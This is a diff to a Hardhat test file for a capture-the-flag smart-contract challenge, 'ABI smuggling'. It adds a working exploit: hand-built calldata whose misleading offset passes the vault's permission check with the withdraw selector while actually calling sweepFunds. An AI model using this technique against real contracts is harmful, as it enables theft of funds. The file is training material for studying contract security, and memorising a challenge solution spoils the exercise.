@@ -1,5 +1,6 @@
 const { ethers } = require("hardhat");
 const { expect } = require("chai");
+const { keccak256, hexZeroPad, hexConcat } = require("ethers/lib/utils");
 
 describe("[Challenge] ABI smuggling", function () {
     let deployer, player, recovery;
@@ -28,6 +29,8 @@ describe("[Challenge] ABI smuggling", function () {
             deployer.address,
             vault.address
         );
+
+        // player = withdraw
         const playerPermission = await vault.getActionId(
             "0xd9caed12",
             player.address,
@@ -59,10 +62,55 @@ describe("[Challenge] ABI smuggling", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // 1 byte = 8 bits (binary) = 256
+        // 1 byte = FF (hex) = 256
+
+        // execute
+        // 0 x selector address offset size actiondata
+
+        // 0 x selector / vault.address / 0x000000000000000000000000064 / 0x00000000000000000000 / withdraw selector /
+
+        // 0 x address (32 bytes) ()
+        //exec selector
+        let executeFunctionSelector = "0x1cff79cd";
+
+        //first param
+        let address = hexZeroPad(vault.address.toString(), 32);
+
+        // offset
+        let actionDataOffset = hexZeroPad("0x64", 32);
+
+        // cheating the system
+        let actionDataArb = hexZeroPad("0x0", 32);
+        let withdrawSelector = hexZeroPad("0xd9caed12");
+
+        let sweepDataSize = hexZeroPad("0x44", 32);
+
+        let sweepData = vault.interface.encodeFunctionData("sweepFunds", [
+            recovery.address,
+            token.address,
+        ]);
+
+        //let actionData = hexZeroPad("", 32);
+
+        let data = hexConcat([
+            executeFunctionSelector,
+            address,
+            actionDataOffset,
+            actionDataArb,
+            withdrawSelector,
+            sweepDataSize,
+            sweepData,
+        ]);
+
+        console.log(data);
+
+        await player.sendTransaction({ to: vault.address, data });
+        // console.log(aactionDataOffsetddress);
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         expect(await token.balanceOf(vault.address)).to.eq(0);
         expect(await token.balanceOf(player.address)).to.eq(0);
         expect(await token.balanceOf(recovery.address)).to.eq(
